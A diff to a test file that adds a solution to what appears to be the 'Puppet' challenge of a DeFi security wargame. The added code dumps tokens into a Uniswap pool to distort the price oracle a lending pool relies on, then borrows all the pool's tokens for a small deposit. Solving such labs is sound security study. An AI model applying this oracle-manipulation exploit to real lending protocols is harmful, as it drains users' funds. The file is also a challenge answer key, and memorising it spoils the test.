@@ -102,7 +102,51 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // we have a lot of tokens, so we can change the current ratio in the uniswap pool
+        // by selling a bunch of them.
+        // to keep things more exact, it's possible to get the approximate value we need to sell
+        // so that the deposit required to borrow the lending pool tokens is just the amount in eth
+        // that the attacker has.
+        
+        // depositRequired = borrowAmount * poolRatio * 2
+        
+        // if sold, then
+        // depositRequired = 25 + calculateTokenToEthInputPrice(tokensSold, 10, 10)
+        // poolRatio = (10 - calculateTokenToEthInputPrice(tokensSold)) / (10 + tokensSold)
+        // 25 + calculateTokenToEthInputPrice(tokensSold, 10, 10) = 2 * 100_000 * (10 - calculateTokenToEthInputPrice(tokensSold)) / (10 + tokensSold)
+        
+        // resulting equation to paste on wolfram alpha:
+        // 25 * 10**18 + (x * 997 * 10*10**18 / (10 * 1000 + x * 997)) = 2 * 100000 * (10 * 10**18 - (x * 997 * 10*10**18 / (10 * 1000 + x * 997))) / (10 + x)
+        // \approx 748.48, rounded up to 749
+      
+        await this.token
+            .connect(attacker)
+            .approve(
+              this.uniswapExchange.address,
+              await this.token.balanceOf(attacker.address)
+            );
+
+        await this.uniswapExchange
+            .connect(attacker)
+            .tokenToEthSwapInput(
+              ethers.utils.parseEther('749'),
+              1,
+              (await ethers.provider.getBlock('latest')).timestamp * 2
+            );
+          
+        const poolTokens = this.token.balanceOf(this.lendingPool.address);
+        
+        console.log(`wei balance: ${(await ethers.provider.getBalance(attacker.address)).toString()}`);
+        console.log(`required amount: ${(await this.lendingPool.calculateDepositRequired(poolTokens)).toString()}`);
+          
+        await this.lendingPool
+            .connect(attacker)
+            .borrow(
+              poolTokens,
+              {
+                value: await this.lendingPool.calculateDepositRequired(poolTokens) 
+              }
+            );
     });
 
     after(async function () {
